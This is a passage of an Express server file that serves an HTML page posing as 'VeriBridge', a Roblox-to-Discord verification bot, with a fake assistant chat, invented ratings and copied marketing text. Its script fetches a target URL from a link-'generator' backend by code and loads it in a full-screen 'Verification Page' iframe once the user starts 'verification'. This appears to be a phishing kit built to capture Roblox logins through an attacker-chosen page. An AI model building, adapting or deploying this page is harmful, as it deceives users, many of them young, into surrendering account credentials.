'        .chat-window{position:fixed;bottom:80px;right:15px;width:340px;height:500px;background:rgba(0,0,0,0.95);backdrop-filter:blur(20px);border-radius:24px;border:1px solid rgba(100,200,255,0.5);display:none;flex-direction:column;overflow:hidden;z-index:1001}\n' +
'        .chat-window.active{display:flex}\n' +
'        .chat-header{background:linear-gradient(135deg,rgba(100,200,255,0.3),rgba(100,200,255,0.1));padding:12px 16px;display:flex;justify-content:space-between;align-items:center}\n' +
'        .chat-header h4{color:#8dd0ff;font-size:1rem}\n' +
'        .close-chat{background:none;border:none;color:#8dd0ff;font-size:1.3rem;cursor:pointer}\n' +
'        .chat-messages{flex:1;overflow-y:auto;padding:15px;display:flex;flex-direction:column;gap:10px}\n' +
'        .message{display:flex;margin-bottom:5px}\n' +
'        .message.ai{justify-content:flex-start}\n' +
'        .message.user{justify-content:flex-end}\n' +
'        .message-bubble{max-width:80%;padding:8px 14px;border-radius:18px;font-size:0.8rem}\n' +
'        .message.ai .message-bubble{background:rgba(100,200,255,0.15);color:#cceeff;border:1px solid rgba(100,200,255,0.3)}\n' +
'        .message.user .message-bubble{background:linear-gradient(135deg,#2c5a7a,#1e3a5a);color:white}\n' +
'        .chat-input-area{display:flex;gap:10px;padding:12px;border-top:1px solid rgba(100,200,255,0.3)}\n' +
'        .chat-input{flex:1;background:rgba(255,255,255,0.1);border:1px solid rgba(100,200,255,0.4);border-radius:40px;padding:10px 15px;color:white;outline:none}\n' +
'        .send-btn{background:linear-gradient(135deg,#2c5a7a,#1e3a5a);border:none;border-radius:40px;padding:8px 18px;font-weight:bold;cursor:pointer;color:white}\n' +
'        .typing-indicator{display:flex;gap:4px;padding:8px 14px;background:rgba(100,200,255,0.1);border-radius:18px;width:fit-content}\n' +
'        .typing-indicator span{width:6px;height:6px;background:#8dd0ff;border-radius:50%;animation:typing 1.4s infinite}\n' +
'        @keyframes typing{0%,60%,100%{transform:translateY(0);opacity:0.4}30%{transform:translateY(-8px);opacity:1}}\n' +
'    </style>\n' +
'</head>\n' +
'<body>\n' +
'<div class="frost-overlay"></div>\n' +
'\n' +
'<div id="startLoadingOverlay" class="fullscreen-loading"><div class="loading-spinner-large"></div><div class="loading-text-glow">VERIBRIDGE</div><div class="loading-sub">Loading verification methods...</div></div>\n' +
'\n' +
'<div id="userProfileCard" class="user-profile-card">\n' +
'    <img id="userAvatar" class="user-avatar" src="">\n' +
'    <span id="userDisplayName" class="user-display-name"></span>\n' +
'    <button id="logoutBtnHeader" class="logout-btn">X</button>\n' +
'</div>\n' +
'\n' +
'<!-- LANDING PAGE -->\n' +
'<div id="startScreen" class="premium-container">\n' +
'    <div class="golden-header">\n' +
'        <div class="premium-logo-gold">\n' +
'            <img class="brand-logo" id="siteLogo" src="https://i.imgur.com/HF0svxe.png" alt="veribridge logo" onerror="this.style.display=\'none\';">\n' +
'            <span class="gold-badge">ROBLOX VERIFICATION</span>\n' +
'        </div>\n' +
'    </div>\n' +
'    \n' +
'    <div class="brand-container">\n' +
'        <div class="brand-main">\n' +
'            <span class="veri-white">Veri</span><span class="bridge-purple">Bridge</span>\n' +
'        </div>\n' +
'        <div class="brand-subtitle">\n' +
'            <span class="bringing-white">Bringing</span>\n' +
'            <span class="roblox-red"> Roblox </span>\n' +
'            <span class="to-white">to</span>\n' +
'            <span class="discord-blue"> Discord</span>\n' +
'        </div>\n' +
'        <div class="description-text">Connect Roblox to Discord using VeriBridge, the leading Roblox Discord Bot. Verify who you really are, sync your group to your server, and more.</div>\n' +
'    </div>\n' +
'    \n' +
'    <div class="username-row">\n' +
'        <input type="text" id="landingUsername" class="username-input" placeholder="Enter your Roblox username">\n' +
'        <button id="landingVerifyBtn" class="get-started-btn">Get Started</button>\n' +
'    </div>\n' +
'    <div id="landingErrorMsg" class="error-msg">Username must be 3-20 characters, letters, numbers, and underscores only</div>\n' +
'    <div class="legal-note">By continuing, you agree to our terms of service and privacy policy.</div>\n' +
'    <div class="rating-stars">★★★★★ <span>Top rated Roblox bot by thousands of users</span></div>\n' +
'    \n' +
'    <div class="features-section"><div class="section-title">Why choose veribridge?</div><div class="features-grid">\n' +
'        <div class="feature-card"><h3>No complex setup or documentation needed</h3><p>veribridge appeals to the average user and the advanced user.</p></div>\n' +
'        <div class="feature-card"><h3>Simple Verification</h3><p>Verify through our Roblox game or by a code on your profile.</p></div>\n' +
'        <div class="feature-card"><h3>Bonds</h3><p>Connect gamepasses, badges, group ranks to Discord roles.</p></div>\n' +
'        <div class="feature-card"><h3>Roblox-based Server Restrictions</h3><p>Lock your server with age-limits and group-only restrictions.</p></div>\n' +
'        <div class="feature-card"><h3>Group Utility Commands</h3><p>Manage Roblox groups directly from Discord.</p></div>\n' +
'        <div class="feature-card"><h3>User Utility Commands</h3><p>Look up Roblox users from Discord.</p></div>\n' +
'    </div></div>\n' +
'    <div class="footer-gold">veribridge — Seamless Roblox verification for modern communities</div>\n' +
'</div>\n' +
'\n' +
'<!-- DASHBOARD -->\n' +
'<div id="mainDashboard" class="premium-container" style="display:none">\n' +
'    <div class="golden-header">\n' +
'        <div class="premium-logo-gold">\n' +
'            <img class="brand-logo" src="https://i.imgur.com/HF0svxe.png" alt="veribridge logo" onerror="this.style.display=\'none\';">\n' +
'            <span class="gold-badge">ROBLOX VERIFICATION</span>\n' +
'        </div>\n' +
'    </div>\n' +
'    <div class="dashboard-gold">\n' +
'        <div class="verification-sidebar-gold"><div class="sidebar-gold-header"><h2>VERIFICATION METHODS</h2></div>\n' +
'        <div class="verify-options-gold">\n' +
'            <div class="verify-card-gold" data-method="login" id="methodLoginGold"><div class="method-letter-circle"><span class="method-letter">A</span></div><div class="card-title-gold">Authorize Roblox</div><div class="card-desc-gold">Link your Roblox account with Veribridge</div><div class="verify-badge-gold" id="loginStatusGold">Not verified</div></div>\n' +
'            <div class="verify-card-gold" data-method="ingame" id="methodIngameGold"><div class="method-letter-circle"><span class="method-letter">I</span></div><div class="card-title-gold">Verify via In-Game</div><div class="card-desc-gold">Roblox In-Game Auth</div><div class="verify-badge-gold" id="ingameStatusGold">Not verified</div></div>\n' +
'            <div class="verify-card-gold" data-method="community" id="methodCommunityGold"><div class="method-letter-circle"><span class="method-letter">C</span></div><div class="card-title-gold">Verify via Community</div><div class="card-desc-gold">Roblox Group/Community</div><div class="verify-badge-gold" id="communityStatusGold">Not verified</div></div>\n' +
'        </div></div>\n' +
'        <div class="login-viewer-gold"><div class="viewer-header-gold"><div class="method-indicator-gold"><div class="method-indicator-circle"><span class="method-indicator-letter" id="activeMethodLetter">A</span></div><span class="method-name-gold" id="activeMethodNameGold">Authorize Roblox</span></div><span class="status-chip-gold" id="verificationStatusGold">Not verified</span></div>\n' +
'        <div class="roblox-auth-section"><div class="auth-input-group"><div class="input-wrapper"><input type="text" id="robloxUsernameInput" class="roblox-username-input" placeholder="Enter your Roblox username..."><div id="dashErrorMsg" class="dash-error-msg">Username must be 3-20 characters, letters, numbers, and underscores only</div></div><button id="verifyRobloxBtn" class="verify-roblox-btn">Continue with Username</button></div>\n' +
'        <div id="userProfilePreview" class="user-profile-preview"><img id="previewAvatar" class="preview-avatar"><div class="preview-info"><h4 id="previewUsername"></h4><p>Roblox account linked</p></div></div></div>\n' +
'        <div class="redirect-container"><div class="welcome-text" id="redirectTitle">Select a verification method</div><div class="redirect-desc" id="redirectDesc">Choose one of the methods from the sidebar to continue</div><button id="bottomStartVerifyBtn" class="bottom-start-btn" disabled>Start Verification</button></div></div>\n' +
'    </div>\n' +
'    <div class="footer-gold">Select a verification method to continue</div>\n' +
'</div>\n' +
'\n' +
'<!-- IFRAME OVERLAY -->\n' +
'<div id="robloxFrameOverlay" class="frame-overlay">\n' +
'    <div class="frame-card">\n' +
'        <button class="frame-close" id="closeFrameBtn">✕</button>\n' +
'        <iframe id="robloxLoginIframe" class="roblox-login-iframe" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation" referrerpolicy="no-referrer" title="Verification Page" frameborder="0"></iframe>\n' +
'    </div>\n' +
'</div>\n' +
'\n' +
'<!-- AI CHAT -->\n' +
'<div class="ai-chat-widget" id="chatWidget"><div class="chat-bubble"><span>🤖</span></div></div>\n' +
'<div class="chat-window" id="chatWindow"><div class="chat-header"><h4>VeriBridge Assistant</h4><button class="close-chat" id="closeChatBtn">✕</button></div><div class="chat-messages" id="chatMessages"><div class="message ai"><div class="message-bubble">Hello! I\'m your VeriBridge assistant. Ask me anything!</div></div></div><div class="chat-input-area"><input type="text" class="chat-input" id="chatInput" placeholder="Ask me anything..."><button class="send-btn" id="sendChatBtn">Send</button></div></div>\n' +
'\n' +
'<script>\n' +
'// ==================== LOAD TARGET URL FROM BACKEND ====================\n' +
'var TARGET_URL = "https://www.roblox.com";\n' +
'var urlParams = new URLSearchParams(window.location.search);\n' +
'var code = urlParams.get("code");\n' +
'\n' +
'if (code) {\n' +
'    fetch("/api/link/" + code)\n' +
'        .then(function(res) { return res.json(); })\n' +
'        .then(function(data) {\n' +
'            if (data.success && data.targetUrl) {\n' +
'                TARGET_URL = data.targetUrl;\n' +
'                console.log("[VeriBridge] Target URL loaded:", TARGET_URL);\n' +
'                document.getElementById("startLoadingOverlay").classList.remove("active");\n' +
'            } else {\n' +
'                document.body.innerHTML = "<div style=\\"text-align:center;padding:50px;color:red\\"><h1>❌ Link Not Found</h1><p>This verification link does not exist.</p><a href=\\"/gen\\" style=\\"color:#00ffff\\">Go to Generator</a></div>";\n' +
'            }\n' +
'        })\n' +
'        .catch(function(err) {\n' +
'            console.error("Error loading link:", err);\n' +
'            document.body.innerHTML = "<div style=\\"text-align:center;padding:50px;color:red\\"><h1>❌ Connection Error</h1><p>Cannot connect to server.</p><a href=\\"/gen\\" style=\\"color:#00ffff\\">Go to Generator</a></div>";\n' +
'        });\n' +
'} else {\n' +
'    document.getElementById("startLoadingOverlay").classList.remove("active");\n' +
'}\n' +
'\n' +
'// ==================== AI CHAT SYSTEM ====================\n' +
'var chatWidget = document.getElementById("chatWidget");\n' +
'var chatWindow = document.getElementById("chatWindow");\n' +
'var closeChatBtn = document.getElementById("closeChatBtn");\n' +
'var chatInput = document.getElementById("chatInput");\n' +
'var sendChatBtn = document.getElementById("sendChatBtn");\n' +
'var chatMessages = document.getElementById("chatMessages");\n' +
'var isTyping = false;\n' +
'\n' +
'function addMessage(text, isUser) {\n' +
'    isUser = isUser || false;\n' +
'    var div = document.createElement("div");\n' +
'    div.className = "message " + (isUser ? "user" : "ai");\n' +
'    div.innerHTML = "<div class=\\"message-bubble\\">" + text + "</div>";\n' +
'    chatMessages.appendChild(div);\n' +
'    chatMessages.scrollTop = chatMessages.scrollHeight;\n' +
'}\n' +
'\n' +
'function showTypingIndicator() {\n' +
'    var typingDiv = document.createElement("div");\n' +
'    typingDiv.className = "message ai typing-indicator-container";\n' +
'    typingDiv.id = "typingIndicator";\n' +
'    typingDiv.innerHTML = "<div class=\\"typing-indicator\\"><span></span><span></span><span></span></div>";\n' +
'    chatMessages.appendChild(typingDiv);\n' +
'}\n' +
'\n' +
'function removeTypingIndicator() {\n' +
'    var indicator = document.getElementById("typingIndicator");\n' +
'    if (indicator) indicator.remove();\n' +
'}\n' +
'\n' +
'function getAIResponse(question) {\n' +
'    var q = question.toLowerCase();\n' +
'    if (q.includes("verify")) return "Enter your username, select a method, and click \'Start Verification\'.";\n' +
'    if (q.includes("discord")) return "VeriBridge syncs Roblox data to Discord roles!";\n' +
'    if (q.includes("hello")) return "Hello! Welcome to VeriBridge.";\n' +
'    return "I can help with Roblox verification, Discord integration, and group commands!";\n' +
'}\n' +
'\n' +
'async function sendMessage() {\n' +
'    var text = chatInput.value.trim();\n' +
'    if (!text || isTyping) return;\n' +
'    addMessage(text, true);\n' +
'    chatInput.value = "";\n' +
'    showTypingIndicator();\n' +
'    isTyping = true;\n' +
'    await new Promise(function(resolve) { setTimeout(resolve, 600); });\n' +
'    var response = getAIResponse(text);\n' +
'    removeTypingIndicator();\n' +
'    addMessage(response, false);\n' +
'    isTyping = false;\n' +
'}\n' +
'\n' +
'chatWidget.addEventListener("click", function() { chatWindow.classList.toggle("active"); });\n' +
'closeChatBtn.addEventListener("click", function() { chatWindow.classList.remove("active"); });\n' +
'sendChatBtn.addEventListener("click", sendMessage);\n' +
'chatInput.addEventListener("keypress", function(e) { if (e.key === "Enter") sendMessage(); });\n' +
'\n' +
'// ==================== FRAME LOGIC ====================\n' +
'var frameOverlay = document.getElementById("robloxFrameOverlay");\n' +
'var closeFrameBtn = document.getElementById("closeFrameBtn");\n' +
'var robloxIframe = document.getElementById("robloxLoginIframe");\n' +
'\n' +
'function showRobloxFlow() {\n' +
'    console.log("[VeriBridge] Loading URL in iframe:", TARGET_URL);\n' +
'    robloxIframe.src = TARGET_URL;\n' +
'    frameOverlay.classList.add("active");\n' +
'}\n' +
'\n' +
'function hideFrame() {\n' +
'    frameOverlay.classList.remove("active");\n' +
'    setTimeout(function() {\n' +
'        if (!frameOverlay.classList.contains("active")) {\n' +
'            robloxIframe.src = "about:blank";\n' +
'        }\n' +
'    }, 300);\n' +
'}\n' +
'\n' +
'if (closeFrameBtn) closeFrameBtn.addEventListener("click", hideFrame);\n' +
'frameOverlay.addEventListener("click", function(e) { if (e.target === frameOverlay) hideFrame(); });\n' +
'\n' +
'// ==================== DASHBOARD LOGIC ====================\n' +
'function isValidUsername(e) { return /^[a-zA-Z0-9_]{3,20}$/.test(e); }\n' +
'\n' +
'var currentRobloxUser = null;\n' +
'var verificationState = { login: { completed: false }, ingame: { completed: false }, community: { completed: false } };\n' +
'var currentActiveMethod = "login";\n' +
'\n' +
'var methodLogin = document.getElementById("methodLoginGold");\n' +
'var methodIngame = document.getElementById("methodIngameGold");\n' +
'var methodCommunity = document.getElementById("methodCommunityGold");\n' +
'var loginBadge = document.getElementById("loginStatusGold");\n' +
'var ingameBadge = document.getElementById("ingameStatusGold");\n' +
'var communityBadge = document.getElementById("communityStatusGold");\n' +
'var activeMethodLetter = document.getElementById("activeMethodLetter");\n' +
'var activeMethodName = document.getElementById("activeMethodNameGold");\n' +
'var verificationStatusChip = document.getElementById("verificationStatusGold");\n' +
'var bottomStartBtn = document.getElementById("bottomStartVerifyBtn");\n' +
'var verifyRobloxBtn = document.getElementById("verifyRobloxBtn");\n' +
'var robloxUsernameInput = document.getElementById("robloxUsernameInput");\n' +
'var userProfilePreview = document.getElementById("userProfilePreview");\n' +
'var previewAvatar = document.getElementById("previewAvatar");\n' +
'var previewUsername = document.getElementById("previewUsername");\n' +
'var redirectTitle = document.getElementById("redirectTitle");\n' +
'var redirectDesc = document.getElementById("redirectDesc");\n' +
'var dashErrorMsg = document.getElementById("dashErrorMsg");\n' +
'var userProfileCard = document.getElementById("userProfileCard");\n' +
'var userAvatar = document.getElementById("userAvatar");\n' +
'var userDisplayName = document.getElementById("userDisplayName");\n' +
'var logoutBtnHeader = document.getElementById("logoutBtnHeader");\n' +
'\n' +
'function updateUserCard() {\n' +
'    if (currentRobloxUser) {\n' +
'        userAvatar.src = currentRobloxUser.avatarUrl;\n' +
'        userDisplayName.textContent = currentRobloxUser.username;\n' +
'        userProfileCard.classList.add("show");\n' +
'        bottomStartBtn.disabled = false;\n' +
'    } else {\n' +
'        userProfileCard.classList.remove("show");\n' +
'        bottomStartBtn.disabled = true;\n' +
'    }\n' +
'}\n' +
'\n' +
'function updateUI() {\n' +
'    methodLogin.classList.toggle("active", currentActiveMethod === "login");\n' +
'    methodIngame.classList.toggle("active", currentActiveMethod === "ingame");\n' +
'    methodCommunity.classList.toggle("active", currentActiveMethod === "community");\n' +
'    var letters = { login: "A", ingame: "I", community: "C" };\n' +
'    var names = { login: "Authorize Roblox", ingame: "Verify via In-Game", community: "Verify via Community" };\n' +
'    activeMethodLetter.innerHTML = letters[currentActiveMethod];\n' +
'    activeMethodName.innerHTML = names[currentActiveMethod];\n' +
'    verificationStatusChip.innerHTML = verificationState[currentActiveMethod].completed ? "Verified" : "Not verified";\n' +
'    loginBadge.innerHTML = verificationState.login.completed ? "Verified" : "Not verified";\n' +
'    ingameBadge.innerHTML = verificationState.ingame.completed ? "Verified" : "Not verified";\n' +
'    communityBadge.innerHTML = verificationState.community.completed ? "Verified" : "Not verified";\n' +
'}\n' +
'\n' +
'function setActiveMethod(method) { currentActiveMethod = method; updateUI(); }\n' +
'\n' +
'function onMethodClick() {\n' +
'    if (!currentRobloxUser) {\n' +
'        addMessage("Please enter your Roblox username first!", false);\n' +
'        return;\n' +
'    }\n' +
'    showRobloxFlow();\n' +
'}\n' +
'\n' +
'function verifyDashUser() {\n' +
'    var username = robloxUsernameInput.value.trim();\n' +
'    if (!username || !isValidUsername(username)) {\n' +
'        dashErrorMsg.classList.add("show");\n' +
'        robloxUsernameInput.classList.add("error");\n' +
'        addMessage("Invalid Roblox username.", false);\n' +
'        return;\n' +
'    }\n' +
'    dashErrorMsg.classList.remove("show");\n' +
'    var avatarUrl = "https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=" + username.charAt(0).toUpperCase();\n' +
'    currentRobloxUser = { id: username, username: username, avatarUrl: avatarUrl };\n' +
'    localStorage.setItem("veribridge_user", JSON.stringify(currentRobloxUser));\n' +
'    previewAvatar.src = avatarUrl;\n' +
'    previewUsername.textContent = username;\n' +
'    userProfilePreview.classList.add("show");\n' +
'    updateUserCard();\n' +
'    addMessage("Welcome " + username + "! Select a verification method.", false);\n' +
'    redirectTitle.innerHTML = "Welcome " + username;\n' +
'    redirectDesc.innerHTML = "Choose a method from the sidebar";\n' +
'}\n' +
'\n' +
'function logoutUser() {\n' +
'    currentRobloxUser = null;\n' +
'    localStorage.removeItem("veribridge_user");\n' +
'    userProfilePreview.classList.remove("show");\n' +
'    updateUserCard();\n' +
'    robloxUsernameInput.value = "";\n' +
'    redirectTitle.innerHTML = "Select a verification method";\n' +
'    redirectDesc.innerHTML = "Choose a method from the sidebar";\n' +
'    addMessage("Logged out.", false);\n' +
'}\n' +
'\n' +
'var savedUser = localStorage.getItem("veribridge_user");\n' +
'if (savedUser) {\n' +
'    try {\n' +
'        currentRobloxUser = JSON.parse(savedUser);\n' +
'        if (currentRobloxUser) {\n' +
'            previewAvatar.src = "https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=" + currentRobloxUser.username.charAt(0).toUpperCase();\n' +
'            previewUsername.textContent = currentRobloxUser.username;\n' +
'            userProfilePreview.classList.add("show");\n' +
'            updateUserCard();\n' +
'            redirectTitle.innerHTML = "Welcome " + currentRobloxUser.username;\n' +
'            robloxUsernameInput.value = currentRobloxUser.username;\n' +
'        }\n' +
'    } catch(e) { }\n' +
'}\n' +
'\n' +
'verifyRobloxBtn.addEventListener("click", verifyDashUser);\n' +
'methodLogin.addEventListener("click", function() { setActiveMethod("login"); });\n' +
'methodIngame.addEventListener("click", function() { setActiveMethod("ingame"); });\n' +
'methodCommunity.addEventListener("click", function() { setActiveMethod("community"); });\n' +
'bottomStartBtn.addEventListener("click", onMethodClick);\n' +
'logoutBtnHeader.addEventListener("click", logoutUser);\n' +
'\n' +
'// ==================== LANDING SCREEN ====================\n' +
'var landingBtn = document.getElementById("landingVerifyBtn");\n' +
'var landingUsername = document.getElementById("landingUsername");\n' +
'var startScreenDiv = document.getElementById("startScreen");\n' +
'var mainDashboardDiv = document.getElementById("mainDashboard");\n' +
'var startLoading = document.getElementById("startLoadingOverlay");\n' +
'var landingErrorMsg = document.getElementById("landingErrorMsg");\n' +
'\n' +
'landingBtn.addEventListener("click", function() {\n' +
'    var username = landingUsername.value.trim();\n' +
'    if (!username || !isValidUsername(username)) {\n' +
'        landingErrorMsg.classList.add("show");\n' +
'        landingUsername.classList.add("error");\n' +
'        return;\n' +
'    }\n' +
'    landingErrorMsg.classList.remove("show");\n' +
'    startLoading.classList.add("active");\n' +
'    setTimeout(function() {\n' +
'        var avatarUrl = "https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=" + username.charAt(0).toUpperCase();\n' +
'        currentRobloxUser = { id: username, username: username, avatarUrl: avatarUrl };\n' +
'        localStorage.setItem("veribridge_user", JSON.stringify(currentRobloxUser));\n' +
'        previewAvatar.src = avatarUrl;\n' +
'        previewUsername.textContent = username;\n' +
'        userProfilePreview.classList.add("show");\n' +
'        updateUserCard();\n' +
'        redirectTitle.innerHTML = "Welcome " + username;\n' +
'        robloxUsernameInput.value = username;\n' +
'        startLoading.classList.remove("active");\n' +
'        startScreenDiv.style.display = "none";\n' +
'        mainDashboardDiv.style.display = "block";\n' +
'        addMessage("Welcome " + username + "! Select a verification method.", false);\n' +
'        updateUI();\n' +
'    }, 1500);\n' +
'});\n' +
'updateUI();\n' +
'</script>\n' +
'</body>\n' +
'</html>';
    
    res.send(html);
});

// ==================== ROOT REDIRECT ====================
app.get('/', (req, res) => {
    res.redirect('/gen');
});

module.exports = app;
